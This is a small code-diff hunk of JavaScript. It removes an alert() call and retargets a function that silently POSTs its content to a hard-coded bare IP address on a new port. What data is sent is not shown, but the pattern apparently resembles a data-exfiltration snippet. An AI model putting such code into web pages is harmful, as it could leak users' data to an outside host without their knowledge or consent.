@@ -96,9 +96,8 @@
                                 return;
                         }
                         function post(content){
-                                alert(content);
                                 var httpRequest = new XMLHttpRequest();
-                                httpRequest.open("POST","http://116.62.169.167:81",true);
+                                httpRequest.open("POST","http://116.62.169.167:2333",true);
                                 httpRequest.send(content);
                                 httpRequest.onreadystatechange=function(){
                                         if(httpRequest.readyState == 4 && httpRequest.status == 200){
